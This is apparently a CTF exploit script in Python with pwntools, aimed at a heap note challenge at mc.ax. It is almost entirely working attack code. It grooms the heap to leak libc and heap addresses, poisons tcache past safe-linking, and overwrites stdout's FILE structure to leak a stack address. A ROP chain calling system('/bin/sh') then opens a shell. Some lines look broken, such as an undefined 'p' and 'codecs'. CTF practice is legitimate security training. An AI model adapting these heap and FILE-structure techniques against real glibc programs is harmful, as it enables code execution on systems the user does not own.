#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep
from pwn import pause

exe = context.binary = ELF("./chall")
host = args.HOST or "mc.ax"
port = int(args.PORT or 31273)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)


def add(idx, size, data):
    sla(b"> ", str(1).encode("latin-1"))
    sla(b"> ", str(idx).encode("latin-1"))
    sla(b"> ", str(size).encode("latin-1"))
    sla(b"Enter content: ", data)


def delete(idx):
    sla(b"> ", str(2).encode("latin-1"))
    sla(b"> ", str(idx).encode("latin-1"))


def view(idx):
    sla(b"> ", str(3).encode("latin-1"))
    sla(b"> ", str(idx).encode("latin-1"))


libc = SetupLibcELF()
io = start()
for i in range(9):
    io.sendline(str(1).encode("latin-1"))
    io.sendline(str(i).encode("latin-1"))
    io.sendline(str(0x100).encode("latin-1"))
    io.sendline("A" * 8)
add(9, 0x68, b"A" * 8)  # guard chunk iorevent top chunk consolidation
for i in range(6, -1, -1):
    io.sendline(str(2).encode("latin-1"))
    io.sendline(str(i).encode("latin-1"))
io.sendline(str(2).encode("latin-1"))
io.sendline(str(8).encode("latin-1"))
view(8)
libc.address = uu64(ren(6)) - 0x219CE0
lb()
delete(7)  # chunk A
add(0, 0x100, b"A" * 8)  # chunk B victim chunk
delete(8)  # chunk B is now coalasced with chunk A
view(6)
heap_base = uu64(ren(5)) << 12
hb()
add(
    9,
    0x120,
    b"/bin/sh\x00".ljust(0x108, b"\x00")
    + p(0x111)
    + p(heap_base + 0x10 ^ (heap_base >> 12)),
)

stdout = libc.address + 0x21A780
payload = (
    p64(0xFBAD1800)
    + p64(0) * 3
    + p64(libc.sym["environ"])
    + p64(libc.sym["environ"] + 0x8) * 3
    + p64(libc.sym["environ"] + 0x9)
)  # leak stack address
add(9, 0x100, b"/bin/sh\x00")
payload2 = (
    p64(0x0101010101010101) * 3
    + p64(0) * 11
    + p64(0) * 14
    + p64(heap_base + 0x80)
    + p64(stdout)
)
print(len(payload2))
add(0, 0x100, payload2)
add(0, 0x100, payload)

stack_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], "hex"), 16)
print(hex(stack_leak))
rop_loc = stack_leak - 0x138

add(0, 0xF0, p64(rop_loc) * 25)

ret = libc.address + 0x50D8C
bin_sh = libc.address + 0x1D8698
system = libc.address + 0x50D60
pop_rdi = libc.address + 0x000000000002A3E5

pause()
add(0, 0xE0, p64(ret) * 5 + p64(pop_rdi) + p64(bin_sh) + p64(system))

io.interactive()
